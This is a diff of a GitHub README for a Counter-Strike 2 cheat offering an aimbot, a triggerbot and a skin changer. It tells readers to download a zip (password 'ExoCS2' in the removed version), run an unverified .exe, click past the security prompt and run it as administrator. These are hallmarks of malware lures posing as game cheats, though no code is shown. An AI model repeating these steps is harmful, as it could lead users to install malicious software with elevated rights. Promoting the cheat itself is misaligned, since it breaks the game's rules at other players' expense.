@@ -1,79 +1,72 @@
-<div align="center">
-    <h1 style="font-size:2.5em;color:#FF4500;">🔥 EXO CS2 CHEAT FOR COUNTER-STRIKE 2 🔥</h1>
-    <h2 style="color:#4682B4;">The Perfect Tool for Skin Changer, Visuals, and Gameplay Control</h2>
-</div>
+# 🎮 COUNTER-STRIKE-2-EXO-CHEAT - Elevate Your Gameplay Experience
 
----
+[![Download from GitHub](https://img.shields.io/badge/Download%20Now-COUNTER--STRIKE--2--EXO--CHEAT-blue)](https://github.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/releases)
 
-<div align="center">
-    <h2 style="color:#32CD32;">📸 Screenshots</h2>
-    <img src="https://github.com/user-attachments/assets/597b9f49-9471-4db8-ae1b-174dbccc084c" alt="Exo CS2 Cheat Screenshot 1" width="80%" style="border:2px solid #FF4500;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-    <img src="https://github.com/user-attachments/assets/21f94ec7-b892-42a7-9225-c719b53ec651" alt="Exo CS2 Cheat Screenshot 2" width="80%" style="border:2px solid #4682B4;border-radius:10px;box-shadow:5px 5px 15px rgba(0,0,0,0.5);margin-bottom:20px;">
-</div>
+## 🚀 Getting Started
 
----
+Welcome to the COUNTER-STRIKE-2-EXO-CHEAT! This powerful tool enhances your Counter-Strike 2 experience with features like a Skin Changer, Aimbot, and Triggerbot. Follow these simple steps to download and run the software.
 
-## 🌟 **Overview**
-Introducing the **Exo CS2 Cheat for Counter-Strike 2**, a brand-new tool designed for players who want to elevate their experience. This cheat includes an advanced **Skin Changer** for cosmetic upgrades, stunning **visuals**, and an adjustable **Aimbot** for precise targeting. Additionally, the cheat comes with a highly responsive **Triggerbot**, allowing players to react faster than ever. With a beautiful interface and an array of customizable settings, Exo CS2 Cheat ensures smooth and controlled gameplay.
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/releases) to get the latest version.
 
-## 🚀 **How to Use**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    <ol>
-        <li>
-            <b style="color:#FF4500;">Download:</b>  
-            <a href="https://github.com/Jaciannanc/COUNTER-STRIKE-2-EXO-CHEAT/releases/download/latest/ExoCS2.zip" style="text-decoration:none;color:#4682B4;">🔹 Click here to download 🔹</a>
-        </li>
-        <li>
-            <b style="color:#32CD32;">Unzip Archive:</b>  
-            💼 Password: `ExoCS2`
-        </li>
-        <li>
-            <b style="color:#FF4500;">Run Application:</b>  
-            Execute the `.exe` file after unzipping.
-        </li>
-        <li>
-            <b style="color:#4682B4;">Activate:</b>  
-            Press <b>HOME</b> to launch and configure the cheat.
-        </li>
-    </ol>
-</div>
+2. **Select the Right Version**  
+   Look for the most recent version of COUNTER-STRIKE-2-EXO-CHEAT. You will see several files available for download, including the main application file.
 
----
+3. **Download the Application**  
+   Click on the file named something like `ExoCS2Cheat.zip` to start downloading. Ensure that your internet connection is stable to avoid interruptions.
 
-<div align="center">
-    <h2 style="color:#32CD32;">💡 FEATURES</h2>
-</div>
+4. **Extract the Files**  
+   Once the download is complete, locate the downloaded file in your "Downloads" folder. Right-click on it and select "Extract All" to unpack the files. You can use built-in Windows extraction tools or third-party software like 7-Zip.
 
-### 🎯 **Aimbot Features**
-- **Adjustable Settings:** Configure aim speed and smoothness for precise control.  
-- **Target Prioritization:** Focus on specific enemies for optimal targeting.  
+5. **Run the Application**  
+   Open the extracted folder and double-click on `ExoCS2Cheat.exe` to launch the tool. You may see a security prompt asking if you want to run this file; click "Run" to proceed.
 
-### ⚙️ **Triggerbot Features**
-- **Instant Response:** Automate fire actions for faster reaction times.  
-- **Enhanced Gameplay:** Improve accuracy and effectiveness during intense encounters.  
+6. **Configure Settings**  
+   After launching the application, you can adjust settings to suit your preferences. Familiarize yourself with the interface and available options.
 
-### 🌟 **Skin Changer & Visuals**
-- **Advanced Skin Changer:** Switch between your favorite skins effortlessly.  
-- **Dynamic Visuals:** Enjoy customizable graphical enhancements for improved clarity.  
+7. **Start Counter-Strike 2**  
+   Launch Counter-Strike 2 on your computer. Use the features of the COUNTER-STRIKE-2-EXO-CHEAT to enhance your gameplay.
 
-### 🎮 **Customization Options**
-- **Menu Interface:** Easily navigate and modify settings using a sleek and responsive menu.  
-- **Multiple Configurations:** Save and adjust settings based on your preferred gameplay style.  
+## 🔧 Features
 
----
+- **Skin Changer**  
+Upgrade your character's appearance with a wide range of cosmetic options. The Skin Changer allows you to customize skins effortlessly.
 
-## 📄 **License**
-<div style="background-color:#F5F5F5;padding:20px;border-radius:10px;">
-    This project is licensed under the **MIT License**. See the LICENSE file for details.
-</div>
+- **Aimbot**  
+Improve your targeting with the adjustable Aimbot. This feature enhances your aim, making it easier to hit your targets.
 
----
+- **Triggerbot**  
+The responsive Triggerbot automatically fires when you aim at an enemy. This allows for quick reactions without manual input.
 
-<div align="center">
-    <h2 style="color:#4682B4;">📬 CONTACT</h2>
-    <p>Need help? Reach out to us:</p>
-    <a href=" " style="text-decoration:none;color:#FF4500;">GitHub</a>  
-    Email: <b style="color:#32CD32;">support@exocs2cheat.com</b>
-</div>
+## 📋 System Requirements
+
+To ensure smooth operation, please make sure your system meets these minimum requirements:
+
+- **Operating System**: Windows 10 or later
+- **Processor**: Intel Core i5 or equivalent
+- **Memory**: 8 GB RAM or more
+- **Graphics**: NVIDIA GTX 760 or equivalent
+- **Disk Space**: At least 1 GB free for installation
+
+## ⚙️ Troubleshooting
+
+- **The application won’t start**: Ensure that you have required permissions. Right-click the file and select "Run as administrator."
+- **Game crashes or performance issues**: Check your system specs against the minimum requirements. Close any unneeded applications running in the background.
+- **Errors while downloading**: If your browser shows errors during the download, try clearing your cache or using a different browser.
+
+## 🤝 Support
+
+If you face any challenges or need assistance, please submit issues on the Issues page of this repository. The community and maintainers are here to help you.
+
+## 📄 License
+
+This project is licensed under the MIT License. Please review the LICENSE file for more information.
+
+## 🌐 Links
+
+- [COUNTER-STRIKE-2-EXO-CHEAT Releases](https://github.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/releases)
+- [GitHub Repository](https://github.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT)
+
+[![Download from GitHub](https://img.shields.io/badge/Download%20Now-COUNTER--STRIKE--2--EXO--CHEAT-blue)](https://github.com/dpgf/COUNTER-STRIKE-2-EXO-CHEAT/releases)
